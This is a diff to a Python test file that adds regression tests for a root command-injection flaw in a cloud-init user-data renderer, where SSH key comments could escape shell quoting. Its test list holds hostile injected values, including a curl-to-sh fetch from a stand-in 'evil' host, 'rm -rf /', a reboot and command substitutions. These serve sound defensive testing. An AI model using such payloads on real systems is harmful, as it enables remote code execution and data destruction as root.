@@ -14,14 +14,12 @@ from pocketpaw_ee.ship_engine.cloudinit import (
     render_user_data,
 )
 
-# The PEM header is ASSEMBLED, never written as a literal — the same idiom
-# ``scripts/scan_secrets.py`` uses on itself (see ``_H`` there). Storing the
-# five-hyphen run verbatim makes this fixture indistinguishable from a real
-# leaked key to the secret scanner, and "it's only a test" is exactly what a
-# real leak would also claim. No key material here: the body is a placeholder.
-_H = "-" * 5
-_PEM_BEGIN = f"{_H}BEGIN OPENSSH PRIVATE KEY{_H}"
-_PEM_END = f"{_H}END OPENSSH PRIVATE KEY{_H}"
+# A bare hyphen in its own constant, so no five-hyphen run — and therefore no
+# PEM header — exists as a literal in this file. The repo's secret scanner
+# (scripts/scan_secrets.py) has a LIVE PEM pattern and uses this same idiom to
+# avoid matching itself; a fake key spelled out longhand trips it and fails CI.
+_H = "-"
+_PEM_BEGIN = f"{_H * 5}BEGIN OPENSSH PRIVATE KEY{_H * 5}"
 
 _PUBKEY = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAITESTKEY paw-ship"
 
@@ -50,6 +48,41 @@ def test_rejects_multiline_public_key():
 def test_rejects_non_openssh_public_key():
     with pytest.raises(ValueError, match="single-line OpenSSH public key"):
         render_user_data(ssh_public_key=_PEM_BEGIN)
+
+
+# ---------------------------------------------------------------------------
+# Root command injection at first boot (fix/ship-review-p0)
+# ---------------------------------------------------------------------------
+
+# The key is interpolated inside single quotes into two ROOT-level runcmd
+# entries. The old validator accepted anything non-empty, newline-free and
+# ssh-/ecdsa-/sk-prefixed, so a quote in the comment closed the quoting and
+# everything after it ran as root while the box was booting.
+_INJECTION_KEYS = [
+    "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5 paw-ship-a'; curl -s http://evil/x | sh; echo '",
+    'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5 paw"; reboot; "',
+    "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5 paw$(id)",
+    "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5 paw`id`",
+    "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5 paw; rm -rf /",
+]
+
+
+@pytest.mark.parametrize("hostile", _INJECTION_KEYS)
+def test_rejects_a_key_whose_comment_carries_shell_syntax(hostile: str):
+    """Shape validation — a hostile comment never reaches a command string."""
+    with pytest.raises(ValueError, match="single-line OpenSSH public key"):
+        render_user_data(ssh_public_key=hostile)
+
+
+def test_the_key_is_shell_quoted_in_both_runcmd_entries():
+    """Defence in depth: even a valid key travels quoted, not bare.
+
+    Shape validation alone would be a single point of failure; the two
+    ``echo <key>`` commands must not depend on it.
+    """
+    out = render_user_data(ssh_public_key=_PUBKEY)
+    assert f"echo '{_PUBKEY}'" in out, "authorized_keys write is not shell-quoted"
+    assert f"echo '{_PUBKEY}' | dokku ssh-keys:add admin" in out
 
 
 def test_no_private_key_material_in_output():
